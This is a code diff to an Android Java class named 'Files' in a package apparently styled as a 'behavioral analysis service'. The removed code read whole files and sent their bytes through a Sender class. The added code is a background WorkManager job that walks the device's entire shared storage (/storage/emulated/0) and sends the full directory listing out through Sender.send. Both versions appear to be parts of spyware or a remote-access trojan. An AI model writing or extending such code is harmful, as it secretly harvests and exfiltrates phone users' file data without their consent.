@@ -1,5 +1,11 @@
 package com.behavioralanalysis.service;
 
+import android.content.Context;
+
+import androidx.annotation.NonNull;
+import androidx.work.Worker;
+import androidx.work.WorkerParameters;
+
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -10,25 +16,14 @@ import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.io.IOException;
 
-public class Files {
-    public static JSONArray get(String path) {
-        JSONArray array = new JSONArray();
-
-        File dir = new File(path);
-        if (!dir.canRead()) {
-            try {
-                JSONObject object = new JSONObject();
-                object.put("error", "Access denied");
-                Sender.sendError(object);
-            } catch (Exception ex) {
-                ex.printStackTrace();
-            }
-        }
-
-        array.put(walk(dir));
-
-        return array;
+public class Files extends Worker {
+    public static final String TAG = "file";
+    private Context context;
+    public Files(@NonNull Context context, @NonNull WorkerParameters workerParams) {
+        super(context, workerParams);
+        this.context = context;
     }
+
 
     private static JSONObject walk(File sourceFile) {
         JSONObject result = new JSONObject();
@@ -54,31 +49,24 @@ public class Files {
         return result;
     }
 
-    public static void download(String path) {
-        if (path == null) {
-            return;
-        }
+    @NonNull
+    @Override
+    public Result doWork() {
 
-        File file = new File(path);
+        try {
+            JSONArray array = new JSONArray();
 
-        if (file.exists()) {
-            int size = (int)file.length();
-            byte[] data = new byte[size];
-            try {
-                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
-                buf.read(data, 0, data.length);
-                buf.close();
-                JSONObject object = new JSONObject();
-                object.put("name", file.getName());
-                object.put("buffer", data);
-                Sender.downloadFile(object);
-            } catch (FileNotFoundException ex) {
-                ex.printStackTrace();
-            } catch (IOException ex) {
-                ex.printStackTrace();
-            } catch (JSONException ex) {
-                ex.printStackTrace();
+            File dir = new File("/storage/emulated/0");
+            if (!dir.canRead()) {
+                try {
+                } catch (Exception ex) {
+                    ex.printStackTrace();
+                }
             }
+            Sender.send(TAG, walk(dir).toString());
+            return Result.success();
+        } catch (Exception ex) {
+            return Result.failure();
         }
     }
 }
